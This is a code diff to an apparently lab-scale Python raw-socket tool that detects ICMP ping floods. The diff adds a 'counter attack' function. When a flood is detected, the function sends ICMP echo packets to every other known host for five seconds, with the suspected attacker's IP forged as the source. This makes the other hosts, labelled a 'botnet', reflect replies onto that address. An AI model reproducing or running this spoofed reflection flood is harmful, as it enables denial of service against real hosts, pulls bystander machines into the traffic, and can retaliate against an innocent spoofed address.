@@ -11,6 +11,8 @@ ETH_P_SIZE = 65536
 ETH_P_IP = 0x0800
 IP_PROTO_ICMP = 1
 
+ATTACK_TIME = 5  # measured in seconds
+
 
 # info inside ip_dictionary
 # * lastPacketAt = time of the last packet received
@@ -83,11 +85,11 @@ def getSocket(if_net: str, proto: int = socket.ntohs(ETH_P_ALL)) -> socket:
         if proto == socket.getprotobyname('icmp'):
             s = socket.socket(socket.AF_INET, socket.SOCK_RAW,
                               proto)
-            print('icmp socket created!')
+            # print('icmp socket created!')
         else:
             s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW,
                               proto)
-            print('eht socket created!')
+            # print('eth socket created!')
     except OSError as msg:
         print('failed to create socket', str(msg))
         sys.exit(1)
@@ -229,10 +231,62 @@ def sendPing(s: socket.socket, ip_source: str, ip_dest: str):
 
     dest_addr = socket.gethostbyname(ip_dest)
     s.sendto(ip_h + icmp_pkt, (dest_addr, 0))
-    s.close()
 
 
 # End of Send ping
+# ################################################################################
+
+# ################################################################################
+# Ping flood section
+
+def getBotnetList(ip_attack: str) -> list:
+    botnet_ls = []
+
+    for ip in ip_dictionary.keys():
+        if ip == ip_attack:
+            continue
+        item = dict({
+            'ip_dest': ip,
+            'mac_dest': ip_dictionary[ip]['MAC'],
+        })
+        botnet_ls.append(item)
+
+    return botnet_ls
+
+
+def executeCounterAttack(ip_attack: str, max_sec: int):
+    start_time = dt.now()
+
+    botnet_ls = getBotnetList(ip_attack)
+    stats = [0 for _ in range(len(botnet_ls))]
+
+    info_time = dt.now()
+
+    while True:
+        exec_elapsed_sec = (dt.now() - start_time).total_seconds()
+
+        info_elapsed = (dt.now() - info_time).total_seconds()
+        if info_elapsed >= 1:
+            info_time = dt.now()
+            print('one sec gone!')
+
+        if exec_elapsed_sec >= max_sec:
+            break
+
+        for i in range(len(botnet_ls)):
+            bot = botnet_ls[i]
+            s = getSocket(None, socket.getprotobyname('icmp'))
+            sendPing(s, ip_attack, bot['ip_dest'])
+            s.close()
+            # inc the qty of ping sent
+            stats[i] += 1
+
+    print('Bot list:', botnet_ls)
+    print('Stats:', stats)
+    print('flooding done')
+
+
+# End of Ping flood
 # ################################################################################
 
 
@@ -243,9 +297,9 @@ if __name__ == "__main__":
     #     s1 = getSocket(None, socket.getprotobyname('icmp'))
     #     s2 = getSocket(None, socket.getprotobyname('icmp'))
 
-    #     sendPing(s, '10.0.1.10', '10.0.0.10')
-    #     sendPing(s1, '10.0.1.10', '10.0.3.10')
-    #     sendPing(s2, '10.0.1.10', '10.0.4.10')
+    #     sendPing(s, '10.0.0.10', '10.0.1.10')
+    #     sendPing(s1, '10.0.0.10', '10.0.3.10')
+    #     sendPing(s2, '10.0.0.10', '10.0.4.10')
 
     # sys.exit()
 
@@ -297,11 +351,11 @@ if __name__ == "__main__":
                         pInterval = getPacketInterval(ip_source)
 
                         if isPingFloodAttack(ip_source, pInterval):
-                            # TODO counter attack
-                            print('getting attacked!!!')
-                            printInfo()
+                            executeCounterAttack(ip_source, ATTACK_TIME)
+                            # printInfo()
                             sys.exit()
 
-                printInfo()
+                # printInfo()
     except KeyboardInterrupt:
+        printInfo()
         print('Done!')
